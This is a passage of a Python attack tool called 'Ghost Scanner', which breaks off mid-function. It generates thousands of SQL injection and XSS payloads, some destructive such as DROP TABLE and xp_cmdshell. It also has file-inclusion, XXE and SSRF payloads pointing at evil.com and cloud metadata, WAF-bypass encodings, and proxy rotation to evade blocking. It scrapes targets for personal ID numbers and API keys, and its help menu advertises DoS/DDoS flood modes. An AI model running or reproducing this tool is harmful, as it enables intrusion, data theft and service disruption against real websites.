#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GHOST SCANNER | ULTRA SAVAGE EDITION
Version 3.0 | MASSIVE PAYLOAD GENERATOR
All-in-one security scanner with 10,000+ payloads for SQLi and XSS,
Business Logic, Improper Input, Mass Assignment, Rate Limit,
Real DOS/DDOS attacks (HTTP, SYN, SSL, UDP).
Cross-platform (Windows, Linux, Termux, Mac).
"""

import os, sys, time, json, re, random, base64, urllib.parse, socket, threading, ssl
from datetime import datetime
from urllib.parse import urljoin, quote, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse
import warnings
import requests
import cloudscraper
from fake_useragent import UserAgent
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn, SpinnerColumn
from rich.table import Table
from rich import box
warnings.filterwarnings('ignore')

# ========== BANNER ==========
BANNER_SKULL = r"""
   ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
  ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
  ██║  ███╗███████║██║   ██║███████╗   ██║       ███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
  ██║   ██║██╔══██║██║   ██║╚════██║   ██║       ╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║       ███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝       ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝
"""
BANNER_SWORDS = r"""
    ╔═══════════════════════════════════════════════════════════════╗
    ║    ██████   █████  ███████ ████████ ███████  ██████  █████  ║
    ║   ██       ██   ██ ██         ██    ██      ██    ██ ██   ██ ║
    ║   ██   ███ ███████ ███████    ██    █████   ██    ██ ███████ ║
    ║   ██    ██ ██   ██      ██    ██    ██      ██    ██ ██   ██ ║
    ║    ██████  ██   ██ ███████    ██    ██       ██████  ██   ██ ║
    ╚═══════════════════════════════════════════════════════════════╝
"""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    console = Console()
    skull = Text(BANNER_SKULL, style="bold red")
    swords = Text(BANNER_SWORDS, style="bold yellow")
    title = Text("GHOST SCANNER", style="bold cyan")
    version = Text("Version 3.0 | ULTRA SAVAGE", style="green")
    made = Text("Made by GhostTeam", style="magenta")
    date = Text(f"Created at {datetime.now().strftime('%Y-%m-%d')}", style="white")
    copyright = Text("ALL COPYRIGHT RESERVED", style="bold red")
    panel = Panel(
        f"{skull}\n{swords}\n{title}\n{version}\n{made}\n{date}\n{copyright}",
        border_style="red",
        padding=(1, 4)
    )
    console.print(panel)

def show_help():
    clear_screen()
    show_banner()
    console = Console()
    help_text = """
[bold cyan]USAGE:[/bold cyan]
  python3 ghostscanner.py -u <TARGET_URL> [OPTIONS]

[bold yellow]SCAN OPTIONS:[/bold yellow]
  -u, --url URL          Target URL (e.g., https://example.com)
  -o, --output FILE      Output JSON file (default: results.json)
  -v, --verbose          Verbose output
  --quick                Quick scan (fewer payloads, faster)
  --no-proxy             Disable proxy usage
  --proxy-list FILE      Load proxies from file (one per line)
  --validate-proxy       Validate proxies before use

[bold yellow]ATTACK OPTIONS:[/bold yellow]
  --dos                  HTTP flood attack
  --ddos                 Multi-method attack (HTTP+SYN+SSL+UDP)
  --syn                  SYN flood attack
  --ssl-reneg            SSL renegotiation attack
  --udp                  UDP flood attack
  --threads N            Number of threads (default: 200)
  --duration N           Attack duration in seconds (default: 30)

[bold yellow]MISCELLANEOUS:[/bold yellow]
  -h, --help             Show this help menu

[bold green]EXAMPLES:[/bold green]
  python3 ghostscanner.py -u https://target.com -v
  python3 ghostscanner.py -u https://target.com --proxy-list proxies.txt --validate-proxy
  python3 ghostscanner.py -u https://target.com --dos --threads 500 --duration 60
  python3 ghostscanner.py -u https://target.com --ddos --duration 30

[bold red]DISCLAIMER:[/bold red]
  This tool is for authorized testing only. Misuse is illegal.
  You are solely responsible for your actions.
"""
    console.print(Panel(help_text, border_style="cyan", title="[bold white]HELP MENU[/bold white]", padding=(1,2)))
    sys.exit(0)

# ========== GHOST SCANNER CLASS ==========
class GhostScanner:
    def __init__(self, target=None, use_proxy=True, proxy_file=None, validate_proxy=False, quick=False):
        self.target = target
        self.use_proxy = use_proxy
        self.proxy_file = proxy_file
        self.validate_proxy = validate_proxy
        self.quick = quick
        self.version = "3.1 ULTRA SAVAGE"
        self.release_date = "2026-09-05"
        self.results_scan = {
            "target": "",
            "domain": "",
            "timestamp": datetime.now().isoformat(),
            "summary": {"total": 0, "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0},
            "vulnerabilities": {
                "sql_injection": [], "xss": [], "command_injection": [],
                "ssti": [], "ldap_injection": [], "nosql_injection": [],
                "xxe": [], "ssrf": [], "path_traversal": [],
                "file_inclusion": [], "open_redirect": [], "csrf": [],
                "deserialization": [], "rce": [], "lfi": [], "rfi": [],
                "sqli_blind": [], "sqli_error": [], "sqli_time": [],
                "xss_dom": [], "xss_stored": [], "xss_reflected": [],
                "business_logic": [], "improper_input_validation": [],
                "mass_assignment": [], "rate_limit": []
            },
            "sensitive_data": {
                "emails": [], "phones": [], "nik": [], "npwp": [], "ktp": [],
                "api_keys": [], "tokens": [], "passwords": [],
                "jwt_tokens": [], "aws_keys": [], "azure_keys": [], "gcp_keys": [],
                "source_code": []
            },
            "ports": [],
            "scan_duration": 0,
            "validated": False
        }
        self.session = requests.Session()
        self.session.verify = False
        self.scraper = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'windows', 'desktop': True},
            delay=2,
            interpreter='native'
        )
        self.proxies = []
        self._load_proxies()
        self.ua = UserAgent()
        self.threads = 500 if not quick else 150
        self.timeout = 5
        self.max_retries = 5
        self.common_ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443]
        self.common_params = ['id', 'page', 'q', 'search', 'user', 'cat', 'product', 'view', 'sort', 'filter', 'name', 'email', 'phone', 'file', 'path', 'redirect', 'url', 'next', 'return', 'lang', 'region', 'type', 'mode', 'action', 'do', 'cmd', 'command', 'exec', 'query', 'sql', 'order', 'by', 'group', 'limit', 'offset', 'index', 'idx']
        self._generate_payloads(quick)
        self._generate_waf_bypass()
        self.result_folder = "results"
        self.sensitive_folder = "sensitive_data"
        os.makedirs(self.result_folder, exist_ok=True)
        os.makedirs(self.sensitive_folder, exist_ok=True)

    def _load_proxies(self):
        if not self.use_proxy:
            return
        if self.proxy_file and os.path.exists(self.proxy_file):
            with open(self.proxy_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if not line.startswith(('http://', 'https://', 'socks')):
                            line = 'http://' + line
                        self.proxies.append({'http': line, 'https': line})
            if self.validate_proxy:
                self._validate_proxies()
        else:
            default = [
                'http://45.76.155.99:8080', 'http://138.68.60.101:8080',
                'http://192.241.164.226:8080', 'http://207.154.231.211:8080',
                'http://159.203.61.165:8080', 'http://157.230.175.221:8080',
                'http://46.101.21.202:8080', 'http://159.89.174.14:8080',
                'http://178.62.238.68:8080', 'http://142.93.215.123:8080',
                'socks5://51.38.114.197:1080', 'socks5://51.75.126.146:1080'
            ]
            for p in default:
                self.proxies.append({'http': p, 'https': p})
        console = Console()
        console.print(f"[green]Loaded {len(self.proxies)} proxies.[/green]")

    def _validate_proxies(self):
        console = Console()
        console.print("[yellow]Validating proxies...[/yellow]")
        valid = []
        for proxy in self.proxies:
            try:
                test = requests.get('https://httpbin.org/ip', proxies=proxy, timeout=3)
                if test.status_code == 200:
                    valid.append(proxy)
            except:
                pass
        self.proxies = valid
        console.print(f"[green]{len(valid)} proxies validated.[/green]")

    def _get_random_proxy(self):
        if self.proxies:
            return random.choice(self.proxies)
        return None

    def _generate_payloads(self, quick):
        # Basic payloads for other categories (not SQL/XSS)
        count = 50 if not quick else 15
        categories = [
            'sql', 'xss', 'lfi', 'rfi', 'command', 'ssti', 'nosql', 'ldap', 'xxe', 'ssrf',
            'sqli_error', 'sqli_time', 'sqli_blind', 'xss_reflected', 'xss_dom', 'xss_stored',
            'path_traversal', 'file_inclusion', 'deserialization', 'rce', 'open_redirect', 'csrf'
        ]
        self.global_payloads = {cat: [] for cat in categories}

        # LFI
        lfi = [
            '../../../../etc/passwd', '/etc/passwd', 'file:///etc/passwd',
            '..\\..\\..\\windows\\win.ini', '../../../../boot.ini',
            'php://filter/convert.base64-encode/resource=/etc/passwd'
        ]
        for p in lfi[:count]:
            self.global_payloads['lfi'].append(p)
            self.global_payloads['path_traversal'].append(p)
            self.global_payloads['file_inclusion'].append(p)

        # RFI
        rfi = [
            'http://evil.com/shell.txt?', 'https://evil.com/shell.php?',
            'http://evil.com/shell.txt%00', 'https://evil.com/cmd.txt?'
        ]
        for p in rfi[:count]:
            self.global_payloads['rfi'].append(p)
            self.global_payloads['file_inclusion'].append(p)

        # Command Injection / RCE
        cmd = [';id', '|id', '&id', '`id`', '$(whoami)', ';ls', '|dir', '&whoami']
        for p in cmd[:count]:
            self.global_payloads['command'].append(p)
            self.global_payloads['rce'].append(p)

        # SSTI
        ssti = ['{{7*7}}', '${7*7}', '{{config}}', '{{self.__class__.__mro__[1].__subclasses__()}}']
        for p in ssti[:count]:
            self.global_payloads['ssti'].append(p)

        # NoSQL
        nosql = ["{'$ne': ''}", "{'$gt': ''}", "{'$or': [{'username':'admin'}]}", "{'$where':'1==1'}"]
        for p in nosql[:count]:
            self.global_payloads['nosql'].append(p)

        # LDAP
        ldap = ['*', 'admin*', 'uid=*', '(&(uid=admin)(userPassword=*))']
        for p in ldap[:count]:
            self.global_payloads['ldap'].append(p)

        # XXE
        xxe = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/xxe">]><root>&test;</root>'
        ]
        for p in xxe[:count]:
            self.global_payloads['xxe'].append(p)

        # SSRF
        ssrf = [
            'http://169.254.169.254/latest/meta-data/',
            'http://127.0.0.1/',
            'http://localhost:8080/admin',
            'http://0.0.0.0:22',
            'file:///etc/passwd'
        ]
        for p in ssrf[:count]:
            self.global_payloads['ssrf'].append(p)

        # Deserialization
        deser = ['O:8:"stdClass":0:{}', 'a:1:{s:4:"test";s:4:"test";}']
        for p in deser[:count]:
            self.global_payloads['deserialization'].append(p)

        # Open Redirect
        redirect = ['http://evil.com', '//evil.com', 'https://evil.com']
        for p in redirect[:count]:
            self.global_payloads['open_redirect'].append(p)

        # CSRF (not payload-based, will be checked separately)
        self.global_payloads['csrf'] = []

        total = sum(len(v) for v in self.global_payloads.values())
        console = Console()
        console.print(f"[+] Generated {total} payloads across {len(self.global_payloads)} categories (SQL/XSS will be generated dynamically).")

    # ========== MASSIVE PAYLOAD GENERATORS ==========
    def _generate_sqli_payloads(self, count=10000):
        """Generate 10,000+ SQL injection payloads from W3Schools + OWASP techniques"""
        payloads = []
        bases = [
            # Boolean-based (W3Schools: 1=1, OR ""="" )
            "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "' OR '1'='1' /*",
            "' OR 'a'='a", "' OR 'x'='x", "' OR 1=1 AND '1'='1",
            "1' AND '1'='1", "1' AND 1=1--", "1' AND 1=1#",
            # Union-based
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT @@version--", "' UNION SELECT database()--",
            "' UNION SELECT user()--", "' UNION SELECT table_name FROM information_schema.tables--",
            # Error-based
            "' AND extractvalue(1,concat(0x7e,database()))--",
            "' AND updatexml(1,concat(0x7e,database()),1)--",
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            # Time-based
            "' AND SLEEP(5)--", "' AND BENCHMARK(1000000,MD5(1))--",
            "' WAITFOR DELAY '0:0:5'--", "' OR SLEEP(5)--",
            # Batched statements (W3Schools)
            "'; DROP TABLE users--", "'; DELETE FROM users--",
            "'; INSERT INTO users VALUES('hacker','pass')--",
            "'; UPDATE users SET password='hacked' WHERE username='admin'--",
            # Stacked queries
            "' ; SELECT * FROM users --", "' ; EXEC xp_cmdshell('dir')--",
            # Comment injection
            "' OR 1=1 --", "' OR 1=1 #", "' OR 1=1 /*",
            "' OR '1'='1' --", "' OR '1'='1' #",
            # OWASP variants
            "' OR '1'='1' AND '1'='1", "' OR '1'='1' AND '1'='2",
            "' OR 1=1 AND 1=2", "' OR 1=1 AND 1=1",
            # Database-specific
            "' OR 1=1-- -", "' OR 1=1#", "' OR 1=1/*",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL,NULL--",
        ]
        # Encoding variations
        encodings = [
            lambda p: p,
            lambda p: p.upper(),
            lambda p: p.lower(),
            lambda p: p.replace(' ', '+'),
            lambda p: p.replace(' ', '%20'),
            lambda p: p.replace(' ', '/**/'),
            lambda p: p.replace('OR', '||'),
            lambda p: p.replace('AND', '&&'),
            lambda p: p.replace('=', 'LIKE'),
            lambda p: p.replace(' ', '/*!*/'),
            lambda p: urllib.parse.quote(p),
            lambda p: urllib.parse.quote(urllib.parse.quote(p)),
            lambda p: p.replace("'", "''"),
            lambda p: p.replace('"', '""'),
            lambda p: p.replace('1', 'true'),
            lambda p: p.replace('0', 'false'),
        ]
        for base in bases:
            for enc in encodings:
                try:
                    payload = enc(base)
                    if len(payload) < 500 and payload not in payloads:
                        payloads.append(payload)
                except:
                    pass
        # Add more variants
        for i in range(10, 100):
            payloads.append(f"' OR 1={i}--")
            payloads.append(f"' OR {i}={i}--")
            payloads.append(f"' OR 'a'='{chr(97+i%26)}'--")
        random.shuffle(payloads)
        return payloads[:count]

    def _generate_xss_payloads(self, count=10000):
        """Generate 10,000+ XSS payloads from OWASP + W3Schools techniques"""
        payloads = []
        # Tag-based (Reflected)
        tags = ['script', 'img', 'svg', 'body', 'input', 'details', 'marquee', 'iframe', 'a', 'div', 'audio', 'video', 'source', 'track', 'style', 'embed', 'object', 'form']
        events = ['onload', 'onerror', 'onfocus', 'onclick', 'onmouseover', 'onmouseout', 'onchange', 'onsubmit', 'onreset', 'onselect', 'onblur', 'onkeydown', 'onkeyup', 'onkeypress', 'ondblclick', 'oncontextmenu', 'onwheel', 'onscroll', 'oncopy', 'oncut', 'onpaste']
        for tag in tags:
            for event in events:
                payloads.append(f"<{tag} {event}=alert(1)>")
                payloads.append(f"<{tag} {event}=alert('XSS')>")
                payloads.append(f"<{tag} {event}=prompt(1)>")
                payloads.append(f"<{tag} {event}=confirm(1)>")
                payloads.append(f"<{tag} {event}=eval('alert(1)')>")
        # Script-based (Stored)
        scripts = [
            "<script>alert(1)</script>",
            "<script>alert('XSS')</script>",
            "<script>prompt(1)</script>",
            "<script>confirm(1)</script>",
            "<script>document.write('<img src=x onerror=alert(1)>')</script>",
            "<script>eval('alert(1)')</script>",
            "<script>setTimeout('alert(1)',0)</script>",
            "<script>setInterval('alert(1)',0)</script>",
        ]
        payloads.extend(scripts)
        # DOM-based
        dom_payloads = [
            "javascript:alert(1)",
            "javascript:alert('XSS')",
            "javascript:prompt(1)",
            "javascript:confirm(1)",
            "data:text/html,<script>alert(1)</script>",
            "document.write('<script>alert(1)</script>')",
            "eval('alert(1)')",
            "setTimeout('alert(1)',0)",
            "setInterval('alert(1)',0)",
            "location='javascript:alert(1)'",
            "top.location='javascript:alert(1)'",
            "parent.location='javascript:alert(1)'",
            "self.location='javascript:alert(1)'",
            "opener.location='javascript:alert(1)'",
        ]
        payloads.extend(dom_payloads)
        # Context-aware (Attribute, URL, CSS)
        attr_payloads = [
            '" onmouseover=alert(1) "',
            "' onfocus=alert(1) '",
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            '&lt;script&gt;alert(1)&lt;/script&gt;',
            '&#60;script&#62;alert(1)&#60;/script&#62;',
        ]
        payloads.extend(attr_payloads)
        # Filter bypass (OWASP techniques)
        bypasses = [
            lambda p: p,
            lambda p: p.upper(),
            lambda p: p.lower(),
            lambda p: p.replace('script', 'scr%00ipt'),
            lambda p: p.replace('alert', 'al%00ert'),
            lambda p: p.replace('onerror', 'on%00error'),
            lambda p: p.replace('onload', 'on%00load'),
            lambda p: p.replace('<', '&#60;'),
            lambda p: p.replace('>', '&#62;'),
            lambda p: p.replace('"', '&quot;'),
            lambda p: p.replace("'", '&#39;'),
            lambda p: p.replace('alert', 'prompt'),
            lambda p: p.replace('alert', 'confirm'),
            lambda p: p.replace('(', '&#40;'),
            lambda p: p.replace(')', '&#41;'),
            lambda p: urllib.parse.quote(p),
            lambda p: urllib.parse.quote(urllib.parse.quote(p)),
            lambda p: base64.b64encode(p.encode()).decode(),
            lambda p: ''.join(random.choice([c.upper(), c.lower()]) for c in p if c.isalpha()),
        ]
        # Combine base payloads with bypasses
        base_payloads = payloads[:]
        for base in base_payloads[:500]:
            for bypass in bypasses[:8]:
                try:
                    p = bypass(base)
                    if len(p) < 400 and p not in payloads:
                        payloads.append(p)
                except:
                    pass
        # Add more variants
        for i in range(10, 100):
            payloads.append(f"<script>alert({i})</script>")
            payloads.append(f"<img src=x onerror=alert({i})>")
        random.shuffle(payloads)
        return payloads[:count]

    def _generate_waf_bypass(self):
        self.waf_bypass_techniques = [
            lambda p: p,
            lambda p: p.upper(),
            lambda p: p.lower(),
            lambda p: p.replace(' ', '/**/'),
            lambda p: p.replace('OR', '||'),
            lambda p: p.replace('AND', '&&'),
            lambda p: p.replace('=', '/*!*/=/*!*/'),
            lambda p: urllib.parse.quote(p),
            lambda p: base64.b64encode(p.encode()).decode() if len(p) < 50 else p,
            lambda p: p.replace('script', 'scr%00ipt'),
            lambda p: p.replace('alert', 'al%00ert'),
            lambda p: ''.join(random.choice([c.upper(), c.lower()]) for c in p if c.isalpha()),
        ]

    def _smart_request(self, url, timeout=5, method='GET', data=None, headers=None):
        self._rotate_user_agent()
        full_headers = {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive'
        }
        if headers:
            full_headers.update(headers)
        for attempt in range(self.max_retries):
            try:
                proxy = self._get_random_proxy() if self.proxies else None
                if method.upper() == 'GET':
                    resp = self.scraper.get(url, headers=full_headers, timeout=timeout, allow_redirects=True, proxies=proxy)
                elif method.upper() == 'POST':
                    resp = self.scraper.post(url, data=data, headers=full_headers, timeout=timeout, allow_redirects=True, proxies=proxy)
                else:
                    resp = self.scraper.request(method, url, headers=full_headers, timeout=timeout, allow_redirects=True, proxies=proxy)
                if resp.status_code in [429, 503, 504, 408]:
                    time.sleep(1)
                    continue
                return resp
            except:
                try:
                    if method.upper() == 'GET':
                        resp = self.session.get(url, headers=full_headers, timeout=timeout, allow_redirects=True)
                    else:
                        resp = self.session.post(url, data=data, headers=full_headers, timeout=timeout, allow_redirects=True)
                    if resp.status_code < 400:
                        return resp
                except:
                    pass
                if attempt < self.max_retries - 1:
                    time.sleep(1)
        return None

    def _rotate_user_agent(self):
        ua = self.ua.random
        self.session.headers.update({'User-Agent': ua})
        self.scraper.headers.update({'User-Agent': ua})

    def _extract_params_from_url(self, url):
        parsed = urlparse(url)
        params = {}
        if parsed.query:
            for kv in parsed.query.split('&'):
                if '=' in kv:
                    k, v = kv.split('=', 1)
                    params[k] = v
        return params

    def _extract_forms(self, html, base_url):
        forms = []
        for form in re.findall(r'<form[^>]*>(.*?)</form>', html, re.I | re.S):
            method_match = re.search(r'method=["\'](.*?)["\']', form, re.I)
            method = method_match.group(1).upper() if method_match else 'GET'
            action_match = re.search(r'action=["\'](.*?)["\']', form, re.I)
            action = action_match.group(1) if action_match else ''
            action_url = urljoin(base_url, action) if action else base_url
            inputs = re.findall(r'<input[^>]*name=["\'](.*?)["\']', form, re.I)
            if inputs:
                forms.append({'method': method, 'url': action_url, 'inputs': inputs})
        return forms

    def _extract_api_endpoints(self, html, base_url):
        endpoints = []
        patterns = [
            r'href=["\'](.*?api.*?)["\']', r'href=["\'](.*?v1.*?)["\']',
            r'href=["\'](.*?rest.*?)["\']', r'href=["\'](.*?graphql.*?)["\']',
            r'action=["\'](.*?api.*?)["\']', r'src=["\'](.*?api.*?)["\']'
        ]
        for pattern in patterns:
            for match in re.findall(pattern, html, re.I):
                url = urljoin(base_url, match)
                if url not in endpoints and url != base_url:
                    endpoints.append(url)
        return endpoints

    def _extract_sensitive_data(self, text):
        data = {
            "emails": [], "phones": [], "nik": [], "npwp": [], "ktp": [],
            "api_keys": [], "tokens": [], "passwords": [],
            "jwt_tokens": [], "aws_keys": [], "azure_keys": [], "gcp_keys": [],
            "source_code": []
        }
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        phone_pattern = r'(\+62|0)[0-9]{9,13}'
        nik_pattern = r'\b[0-9]{16}\b'
        npwp_pattern = r'\b[0-9]{15}\b'
        data['emails'] = list(set(re.findall(email_pattern, text)))
        data['phones'] = list(set(re.findall(phone_pattern, text)))
        data['nik'] = list(set(re.findall(nik_pattern, text)))
        data['npwp'] = list(set(re.findall(npwp_pattern, text)))
        data['ktp'] = data['nik']
        api_key_patterns = [
            r'[a-zA-Z0-9]{32,}', r'sk-[a-zA-Z0-9]{32,}', r'AIza[0-9A-Za-z-_]{35}',
            r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
            r'Bearer [a-zA-Z0-9\-_\.]+', r'[a-zA-Z0-9]{40}', r'ghp_[a-zA-Z0-9]{36}',
            r'AKIA[0-9A-Z]{16}', r'[a-zA-Z0-9+/]{40}={0,2}'
        ]
        api_keys = []
        for pattern in api_key_patterns:
            matches = re.findall(pattern, text)
            if matches:
                api_keys.extend(matches)
        data['api_keys'] = list(set(api_keys))
        data['jwt_tokens'] = [m for m in api_keys if '.' in m and len(m.split('.')) == 3]
        data['aws_keys'] = [m for m in api_keys if m.startswith('AKIA')]
        data['azure_keys'] = [m for m in api_keys if 'azure' in m.lower() or 'AZ' in m]
        data['gcp_keys'] = [m for m in api_keys if 'google' in m.lower() or 'GCP' in m]
        code_patterns = [
            r'(?:<code>|<pre>|<textarea>)(.*?)(?:</code>|</pre>|</textarea>)',
            r'(?:function|class|def|import|require|include|echo|print|console\.log|System\.out|print_r|var_dump)[^;]*;',
            r'(?:<script>|<style>)(.*?)(?:</script>|</style>)'
        ]
        source_code = []
        for pattern in code_patterns:
            matches = re.findall(pattern, text, re.I | re.S)
            if matches:
                source_code.extend(matches)
        data['source_code'] = [sc[:500] for sc in source_code if len(sc) > 20]
        return data

    # ========== NEW MODULES ==========

    # --- Business Logic Error ---
    def _check_business_logic(self, target, params):
        findings = []
        business_params = ['price', 'discount', 'coupon', 'quantity', 'total', 'amount', 'qty', 'code']
        for param, value in params.items():
            if any(bp in param.lower() for bp in business_params):
                if 'price' in param.lower() or 'amount' in param.lower() or 'total' in param.lower():
                    for payload in ['0', '-1', '0.01', '9999999']:
                        test_url = target + '?' + param + '=' + quote(payload)
                        resp = self._smart_request(test_url, timeout=4)
                        if resp and resp.status_code == 200:
                            if 'error' not in resp.text.lower() and 'invalid' not in resp.text.lower():
                                findings.append({
                                    "type": "Business Logic Error (Price Manipulation)",
                                    "param": param,
                                    "payload": payload,
                                    "evidence": f"Server accepted modified {param} value",
                                    "risk": "HIGH",
                                    "confidence": 85
                                })
                if 'coupon' in param.lower() or 'code' in param.lower():
                    for payload in ['DISCOUNT10', 'SAVE20', 'FREE']:
                        test_url = target + '?' + param + '=' + quote(payload)
                        resp = self._smart_request(test_url, timeout=4)
                        if resp and resp.status_code == 200:
                            if 'applied' in resp.text.lower() or 'accepted' in resp.text.lower():
                                findings.append({
                                    "type": "Business Logic Error (Coupon Abuse)",
                                    "param": param,
                                    "payload": payload,
                                    "evidence": "Coupon accepted repeatedly",
                                    "risk": "MEDIUM",
                                    "confidence": 80
                                })
                if 'qty' in param.lower() or 'quantity' in param.lower():
                    for payload in ['-1', '-10']:
                        test_url = target + '?' + param + '=' + quote(payload)
                        resp = self._smart_request(test_url, timeout=4)
                        if resp and resp.status_code == 200:
                            if 'error' not in resp.text.lower() and 'invalid' not in resp.text.lower():
                                findings.append({
                                    "type": "Business Logic Error (Negative Quantity)",
                                    "param": param,
                                    "payload": payload,
                                    "evidence": "Negative quantity accepted",
                                    "risk": "HIGH",
                                    "confidence": 85
                                })
        return findings

    # --- Improper Input Validation ---
    def _check_improper_input(self, target, params):
        findings = []
        for param, value in params.items():
            long_payload = 'A' * 5000
            test_url = target + '?' + param + '=' + quote(long_payload)
            resp = self._smart_request(test_url, timeout=4)
            if resp and (resp.status_code == 500 or 'error' in resp.text.lower() or 'exception' in resp.text.lower()):
                findings.append({
                    "type": "Improper Input Validation (Buffer Overflow)",
                    "param": param,
                    "payload": "5000 chars",
                    "evidence": "Server error on long input",
                    "risk": "MEDIUM",
                    "confidence": 90
                })
            special_payload = "'\"<>&%;()$#@!*"
            test_url = target + '?' + param + '=' + quote(special_payload)
            resp = self._smart_request(test_url, timeout=4)
            if resp and resp.status_code == 500:
                findings.append({
                    "type": "Improper Input Validation (Special Characters)",
                    "param": param,
                    "payload": special_payload,
                    "evidence": "Server error on special chars",
                    "risk": "MEDIUM",
                    "confidence": 85
                })
            if param in ['id', 'page', 'limit', 'offset']:
                test_url = target + '?' + param + '=' + quote('not_an_integer')
                resp = self._smart_request(test_url, timeout=4)
                if resp and ('error' in resp.text.lower() or 'exception' in resp.text.lower() or resp.status_code == 500):
                    findings.append({
                        "type": "Improper Input Validation (Type Mismatch)",
                        "param": param,
                        "payload": "not_an_integer",
                        "evidence": "Server error on wrong data type",
                        "risk": "LOW",
                        "confidence": 80
                    })
        return findings

    # --- Mass Assignment / Parameter Pollution ---
    def _check_mass_assignment(self, target, params):
        findings = []
        hidden_params = ['role', 'is_admin', 'admin', 'verified', 'status', 'privilege', 'level', 'group']
        for param in hidden_params:
            for payload in ['admin', 'true', '1', 'root']:
                test_url = target + '?' + param + '=' + quote(payload)
                resp = self._smart_request(test_url, timeout=4)
                if resp and resp.status_code == 200:
                    if 'admin' in resp.text.lower() or 'success' in resp.text.lower():
                        findings.append({
                            "type": "Mass Assignment (Hidden Parameter)",
                            "param": param,
                            "payload": payload,
                            "evidence": f"Server accepted {param}={payload}",
                            "risk": "CRITICAL",
                            "confidence": 80
                        })
        return findings

    # --- Rate Limit Testing ---
    def _check_rate_limit(self, target):
        findings = []
        console = Console()
        console.print("[yellow]Testing rate limit with 10 rapid requests...[/yellow]")
        successes = 0
        for i in range(10):
            resp = self._smart_request(target, timeout=3)
            if resp and resp.status_code < 400:
                successes += 1
            time.sleep(0.05)
        if successes > 5:
            findings.append({
                "type": "Rate Limit Missing",
                "payload": "10 requests in 0.5s",
                "evidence": f"{successes} requests succeeded without blocking",
                "risk": "MEDIUM",
                "confidence": 90
            })
        return findings

    # ========== PORT SCANNER ==========
    def _scan_ports(self, domain):
        open_ports = []
        console = Console()
        console.print(f"[yellow]Scanning common ports on {domain}...[/yellow]")
        with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
                      BarColumn(), TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                      TimeElapsedColumn(), console=console) as progress:
            task = progress.add_task("[cyan]Port Scan", total=len(self.common_ports))
            for port in self.common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1.5)
                    result = sock.connect_ex((domain, port))
                    if result == 0:
                        open_ports.append(port)
                    sock.close()
                except:
                    pass
                progress.update(task, advance=1)
        return open_ports

    # ========== SQL SCAN with 10k payloads ==========
    def _check_sql(self, target, param, original_value, payload):
        try:
            parsed = urlparse(target)
            query = parsed.query
            if query:
                new_query = query.replace(f"{param}={original_value}", f"{param}={quote(payload)}")
                url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
            else:
                url = f"{target}?{param}={quote(payload)}"
            start = time.time()
            resp = self._smart_request(url, timeout=4)
            elapsed = time.time() - start
            if not resp:
                return None
            if re.search(r'(mysql|sql|syntax|error|warning|odbc|driver|db2|ora-|postgres|sqlite|SQLSTATE|SQLCODE)', resp.text, re.I):
                return {"type": "SQL Injection (Error)", "param": param, "payload": payload[:100],
                        "evidence": "DB error", "risk": "CRITICAL", "confidence": 95}
            if any(x in payload for x in ['SLEEP','WAITFOR','BENCHMARK']) and elapsed > 2:
                return {"type": "SQL Injection (Time)", "param": param, "payload": payload[:100],
                        "evidence": f"Delay {elapsed:.1f}s", "risk": "CRITICAL", "confidence": 85}
            if 'AND 1=1' in payload or 'AND 1=2' in payload:
                if hasattr(self, '_baseline_lengths') and param in self._baseline_lengths:
                    base_len = self._baseline_lengths[param]
                    diff = abs(len(resp.text) - base_len)
                    if diff > 100:
                        return {"type": "SQL Injection (Boolean)", "param": param, "payload": payload[:100],
                                "evidence": f"Length difference {diff}", "risk": "CRITICAL", "confidence": 80}
        except:
            pass
        return None

    def _scan_sql(self, target, params):
        results = []
        # Collect baselines for boolean checks
        self._baseline_lengths = {}
